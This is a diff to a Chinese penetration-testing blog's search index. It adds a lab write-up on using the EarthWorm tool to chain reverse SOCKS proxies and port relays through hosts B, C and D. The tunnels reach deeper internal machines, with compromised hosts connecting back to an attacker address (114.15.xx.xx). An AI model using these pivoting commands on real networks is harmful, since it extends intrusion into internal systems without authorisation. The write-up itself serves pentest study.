@@ -1815,7 +1815,7 @@
 <h3 id="05-icmp隧道的防范"><a href="#05-icmp隧道的防范" class="headerlink" title="05.icmp隧道的防范"></a>05.icmp隧道的防范</h3><p>一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道则再很短时间内产生上千个数据包。</p>
 ]]></content>
       <categories>
-        <category>内网渗透测试</category>
+        <category>内网渗透测试,隧道构建</category>
       </categories>
       <tags>
         <tag>windows</tag>
@@ -6706,6 +6706,61 @@
       </categories>
       <tags>
         <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ew的使用记录</title>
+    <url>/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="0x00-实验拓扑"><a href="#0x00-实验拓扑" class="headerlink" title="0x00.实验拓扑"></a>0x00.实验拓扑</h2><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112203412479.png" class>
+
+<a id="more"></a>
+
+<h2 id="0x01-实验一"><a href="#0x01-实验一" class="headerlink" title="0x01.实验一"></a>0x01.实验一</h2><p><strong>当获取到B的权限后，对C进行安全测试</strong></p>
+<p><code>A执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><code>B执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s rssocks -d 114.15.xx.xx -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><code>代理测试</code></p>
+<img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112173653122.png" class>
+
+<h2 id="0x02-实验二"><a href="#0x02-实验二" class="headerlink" title="0x02.实验二"></a>0x02.实验二</h2><p><strong>当获取到C的权限后对D进行安全测试</strong></p>
+<p><code>A执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><code>C执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+
+<p><code>B执行，连接A C</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s lcx_slave -d 114.15.xx.xx -e 8888 -f 10.10.10.164 -g 9999</span><br></pre></td></tr></table></figure>
+
+<p><code>代理测试</code></p>
+<img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112174844945.png" class>
+
+<h2 id="0x03-实验三"><a href="#0x03-实验三" class="headerlink" title="0x03.实验三"></a>0x03.实验三</h2><p><strong>当获取到D的权限后对E进行安全测试</strong></p>
+<p><code>A执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s rcsocks -l 10801 -e 8886</span><br></pre></td></tr></table></figure>
+
+<p><code>B执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s lcx_slave -d 115.14.xx.xx -e 8886 -f 10.10.10.164 -g 6666</span><br></pre></td></tr></table></figure>
+
+<p><code>C执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s lcx_listen -l 6666 -e 7778</span><br></pre></td></tr></table></figure>
+
+<p><code>D执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew -s rssocks -d 10.10.20.128 -e 7778</span><br></pre></td></tr></table></figure>
+
+<p><code>代理测试</code></p>
+<img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112204533430.png" class>
+
+]]></content>
+      <categories>
+        <category>内网渗透测试,隧道构建</category>
+      </categories>
+      <tags>
+        <tag>windows</tag>
+        <tag>内网安全</tag>
       </tags>
   </entry>
 </search>
